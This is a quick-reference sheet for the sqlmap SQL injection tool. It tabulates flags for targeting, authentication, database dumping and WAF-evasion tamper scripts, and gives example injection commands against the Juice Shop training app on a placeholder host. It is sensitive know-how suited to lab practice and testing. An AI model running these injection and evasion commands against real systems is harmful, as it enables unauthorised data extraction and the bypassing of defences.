# sqlmap Quick Reference

## Core Flags

| Flag | Description |
|------|-------------|
| `-u URL` | Target URL with injection point |
| `-p PARAM` | Parameter to test |
| `--data DATA` | POST data (string or JSON) |
| `--method METHOD` | HTTP method (GET, POST, PUT) |
| `--batch` | Non-interactive (auto-answer Yes) |
| `--dbms DBMS` | Target DBMS (sqlite, mysql, postgresql, etc.) |
| `--level N` | Test level 1-5 (default: 1) |
| `--risk N` | Risk level 1-3 (default: 1) |
| `--technique TECH` | Injection techniques: B=Boolean, E=Error, U=Union, S=Stacked, T=Time |
| `--threads N` | Concurrent threads |
| `--timeout N` | Connection timeout in seconds |
| `--time-sec N` | Seconds for time-based detection (default: 5) |

## Authentication

| Flag | Description |
|------|-------------|
| `--cookie COOKIE` | Session cookie value |
| `--headers HEADERS` | Extra headers (e.g. `Authorization: Bearer ...`) |
| `--auth-type TYPE` | HTTP auth type (Basic, Digest, NTLM) |
| `--auth-cred USER:PASS` | HTTP auth credentials |

## Data Extraction

| Flag | Description |
|------|-------------|
| `--dbs` | List databases |
| `--tables` | List tables |
| `--columns` | List columns |
| `--dump` | Dump table data |
| `-D DB` | Specify database |
| `-T TABLE` | Specify table |
| `-C COLUMNS` | Specify columns |
| `--count` | Count rows instead of dumping |

## WAF Evasion

| Flag | Description |
|------|-------------|
| `--tamper SCRIPTS` | Tamper scripts (comma-separated) |
| `--random-agent` | Random User-Agent header |
| `--delay N` | Delay between requests in seconds |
| `--safe-url URL` | URL to visit between injection attempts |

### Common tamper scripts for Juice Shop

- `space2comment` — Replace spaces with `/**/`
- `between` — Replace `>` with `NOT BETWEEN 0 AND`
- `charencode` — URL-encode payload characters
- `equaltolike` — Replace `=` with `LIKE`

## Output Options

| Flag | Description |
|------|-------------|
| `--output-dir DIR` | Custom output directory |
| `-v N` | Verbosity level 0-6 |
| `--flush-session` | Flush session data for current target |

## Examples for Juice Shop

```bash
# Search endpoint (known SQLi)
sqlmap -u "http://target:3000/rest/products/search?q=test" -p q \
  --batch --dbms=sqlite --technique=BEUST --level=3 --risk=2

# Login endpoint
sqlmap -u "http://target:3000/rest/user/login" \
  --data='{"email":"test","password":"test"}' -p email \
  --batch --dbms=sqlite --level=3 --risk=2

# With auth token
sqlmap -u "http://target:3000/api/Products/1" -p id \
  --headers="Authorization: Bearer TOKEN" \
  --batch --dbms=sqlite --level=3 --risk=2

# Aggressive mode with WAF evasion
sqlmap -u "http://target:3000/rest/products/search?q=test" -p q \
  --batch --dbms=sqlite --level=5 --risk=3 \
  --tamper=space2comment,between --threads=4
```
